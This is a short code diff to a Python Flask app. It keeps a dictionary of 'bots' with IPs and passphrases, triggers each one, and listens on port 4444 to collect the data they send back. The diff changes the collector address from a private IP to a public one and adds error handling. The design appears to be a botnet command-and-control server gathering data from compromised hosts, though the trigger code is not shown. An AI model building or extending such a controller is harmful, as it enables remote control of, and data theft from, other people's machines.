@@ -9,7 +9,7 @@ app = Flask(__name__)
 
 bot_dict = {}
 
-system_ip = '192.168.235.93'
+system_ip = '139.59.69.139'
 
 def listner(system_ip, system_port):
     listner = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -31,9 +31,14 @@ def test():
     bot_names = bot_dict.keys()
     for bot in bot_names:
         bot_ip = bot_dict[bot][0]
+        print(bot_ip)
         bot_passphrase = bot_dict[bot][1]
-        trigger(bot_ip, bot_passphrase)
-        data = listner(system_ip, 4444)
+        try:
+            trigger(bot_ip, bot_passphrase)
+            data = listner(system_ip, 4444)
+        except:
+            data = json.dumps([bot + ' failed to fetch data'])
+            pass
         data_package = data_package + data
     return data_package
 
